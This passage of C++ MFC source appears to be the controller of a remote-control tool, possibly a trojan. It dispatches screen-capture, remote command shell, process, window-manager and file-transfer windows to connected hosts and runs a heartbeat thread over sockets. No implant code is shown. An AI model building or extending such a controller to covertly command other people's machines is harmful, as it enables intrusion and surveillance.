		 case CMD_SCREENDLG_SHOW://显示屏幕窗口
			 {
				// ::MessageBox(NULL, "正在创建窗口" , "biaoti" , MB_OK); 
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_SCREENDLGSHOW, (DWORD)pInput, 0);//发出一个创建屏幕窗口响应消息 让OnScreenDlgShow进行响应处理	
				 break;
			 }
		 case CMD_SHELLDLG_SHOW://显示 cmd 命令行窗口
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect =socket;
				 This->PostMessage(WM_CMD_DLG_SHOW, (DWORD)pInput, 0);//发出一个创建屏幕窗口响应消息 让OnCmdDlgShow进行响应处理	
				 break;
			 }
		 case CMD_PROCESS_SHOW:
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect = socket;
				 This->PostMessageA(WM_PROCESS_SHOW, (DWORD) pInput, 0);
				 break;
			 }
		 case CMD_WINDOW_MANAGER_DLG_SHOW:
			 {
				 LPSocketInput pInput = new SocketInput;
				 pInput->sMainConnect = socket;
				 This->PostMessage(WM_WINDOW_MANAGER_DLG_SHOW, (DWORD) pInput, 0);
				break;
			 }
		 default:
			 {
				 CString  Msg;
				 Msg.Format("无法处理的CMD编号为：%d", msgHead.dwCmd); 
				 ::MessageBox(NULL, "与某主机...通信时 收到无法处理的消息" , Msg , MB_OK); 
			 }
		}


	}
       return 0;
}




//在线检测线程  心跳包
unsigned  __stdcall  ThreadCheck(void * pParam)         
{
	//心跳包
	CMaizangDlg *This = (CMaizangDlg*)pParam;
	MsgHead msgHead;
	msgHead.dwCmd = CMD_HEARTBEAT;
	msgHead.dwSize = 0;
	
	DWORD dwCount = 0,dwSel;
	while(1)
	{
		dwCount++;
		dwSel = dwCount % 3;
		if(dwSel == 0)//检测偶数  发送给偶数服务端心跳包
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=0; i < AllNum; i+=2)
			{	
				socket=This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{
					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}
		else if(dwSel == 1)//检测奇数 发送给奇数服务端心跳包
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=1; i < AllNum; i+=2)
			{	
				socket=This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{
					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}
		else if(dwSel == 2)//检测所有 发送给所有服务端心跳包
		{
			CAutoLock Lock(This->cOnlineLock);
			int AllNum = This->m_List_Online.GetItemCount();
			DWORD socket;
			for(int i=0; i < AllNum; i++)
			{	
				socket = This->m_List_Online.GetItemData(i);
				if(!SendMsg(socket,NULL,&msgHead))
				{

					This->m_List_Online.DeleteItem(i);
					AllNum--;
					i--;
				}	
			}
		}

		This->Online_computer_count = This->m_List_Online.GetItemCount();
		This->strStatusBar.Format("当前在线主机 [%d]", This->Online_computer_count);
        This->m_wndStatusBar.SetText(This->strStatusBar, 0, 0); 	    
	    
		Sleep(50 * 1000);//一分钟查询一次
	}
}



// 产生文件传输窗口
LRESULT CMaizangDlg::OnFileDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CFileManage * pFileDlg = new CFileManage;
	pFileDlg->Create(IDD_FILEMANAGE, GetDesktopWindow());//创建一个非模态对话框
	pFileDlg->ShowWindow(SW_SHOW);
	//调用函数让文件传输窗口显示状态信息标明属于哪台主机的文件列表 以及显示主机磁盘信息
 	pFileDlg->SetConnSocket(pInput->sMainConnect);//将sMainConnect传递到CManageFile的窗口对象中去
	
	delete pInput;
	return 0;	 
}

// 产生屏幕传输窗口
LRESULT CMaizangDlg::OnScreenDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CScreenDlg * pScreenDlg = new CScreenDlg;
	pScreenDlg->Create(IDD_SCREEN, GetDesktopWindow());//创建一个非模态对话框
	pScreenDlg->ShowWindow(SW_SHOW);
	
 	pScreenDlg->SetSCreenSocket(pInput->sMainConnect);//将sMainConnect传递到CScreenDlg的窗口对象中去
	pScreenDlg->SetChoseSocket(m_ChoseSocket);
	//pScreenDlg->GetFirstScreen();
	delete pInput;
	return 0;	 
}


// 产生屏幕传输窗口
LRESULT CMaizangDlg::OnCmdDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;
	
	CCmdDlg * pCmdDlg = new CCmdDlg;
	pCmdDlg->Create(IDD_CMD_SHELL, GetDesktopWindow());//创建一个非模态对话框
	pCmdDlg->ShowWindow(SW_SHOW);
	pCmdDlg->m_MainSocket = pInput->sMainConnect;
 	//pScreenDlg->SetSCreenSocket(pInput->sMainConnect);//将sMainConnect传递到CScreenDlg的窗口对象中去
	//pScreenDlg->SetChoseSocket(m_ChoseSocket);
	
	delete pInput;
	return 0;	 
}

CEdit a;
LRESULT CMaizangDlg::OnProcessShow(WPARAM wParam, LPARAM lParam){
	LPSocketInput pInput = (LPSocketInput) wParam;
	CProcess *pProcess = new CProcess;
	pProcess->m_ConnSocket = pInput->sMainConnect;
	pProcess->Create(IDD_PROCESS);
	pProcess->ShowWindow(SW_SHOW);
	delete pInput;
	return 0;
}

LRESULT CMaizangDlg::OnWindowManagerDlgShow(WPARAM wParam, LPARAM lParam){
	LPSocketInput pInput = (LPSocketInput)wParam;

	CWindowManagerDlg * pWindowManagerDlg = new CWindowManagerDlg;
	pWindowManagerDlg->Create(IDD_WINDOW_MANAGER, GetDesktopWindow());//创建一个非模态对话框
	pWindowManagerDlg->ShowWindow(SW_SHOW);
	pWindowManagerDlg->m_MainSocket = pInput->sMainConnect;
	pWindowManagerDlg->windowListShow();
	return 0;
}